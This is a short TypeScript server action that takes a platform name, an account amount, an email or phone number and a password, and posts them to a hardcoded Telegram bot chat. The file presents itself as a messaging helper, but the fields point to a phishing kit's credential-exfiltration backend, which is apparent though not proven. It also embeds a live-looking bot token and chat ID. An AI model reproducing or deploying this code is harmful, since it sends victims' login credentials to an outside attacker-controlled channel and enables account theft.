"use server"

export async function sendTelegramMessage(platformName: string, accountAmount: string, emailOrNumber: string, password: string) {
  const BOT_TOKEN = "8142264868:AAEYqUG9eGaSXk0Gj5BHCEo2a0a3eC2r6l0"
  const CHAT_ID = "7335173906"

  const message = `
Platform Name: ${platformName}
Account Amount: ${accountAmount}
Email/Number: ${emailOrNumber}
Password: ${password}
  `.trim()

  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`

  try {
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
      }),
    })

    if (!response.ok) {
      const errorData = await response.json()
      console.error("Failed to send Telegram message:", response.status, errorData)
      return { success: false, error: `Failed to send message: ${errorData.description || response.statusText}` }
    }

    console.log("Telegram message sent successfully!")
    return { success: true }
  } catch (error) {
    console.error("Error sending Telegram message:", error)
    return { success: false, error: `Error sending message: ${error instanceof Error ? error.message : String(error)}` }
  }
}
